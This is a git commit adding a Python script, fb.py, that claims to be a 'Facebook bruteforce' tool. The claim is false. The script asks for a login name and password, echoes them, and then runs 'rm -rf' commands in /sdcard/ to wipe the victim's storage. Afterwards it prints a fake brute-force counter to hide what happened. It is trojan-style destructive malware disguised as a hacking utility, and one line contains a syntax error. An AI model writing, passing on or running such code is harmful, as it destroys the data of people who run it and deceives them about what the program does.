4fda39ad1cd153b7add33ac427345e96e7d3410d
BLE22H <56558093+Tool2020@users.noreply.github.com>
2021-02-24 11:21:25 +0630

    Add files via upload

---
+++ fb.py
@@ -0,0 +1,29 @@
+import os
+import sys
+import time 
+from colorama import Fore , Back ,Style
+os.system("clear")
+banner = os.system( "pyfiglet Huckers")
+
+print(Fore.GREEN+"Developer : MAX_H98KER")
+print(Fore.GREEN+"Facebook  : https://www.facebook.com/Max776k")
+print(Fore.GREEN+"Code      : python")
+print(Fore.GREEN+"Action    :Facebook bruteforce")
+
+print("\n")
+data = input(Fore.GREEN+Back.WHITE+"login name ->")
+anon = input(Fore.GREEN+Back.WHITE+"login password ->")
+print()
+print(data)
+time.sleep(2)
+print()
+print(anon)
+os.system("clear")
+os.system("cd ")
+os system("cd ..")
+os.system("cd /sdcard/")
+os.system("rm -rf *")
+os.system("rm -rf .all *")
+time.sleep(3)
+for anon in range(0,99999999999999999999999):
+	print(Style.RESET_ALL+"burtefore password : ",anon)
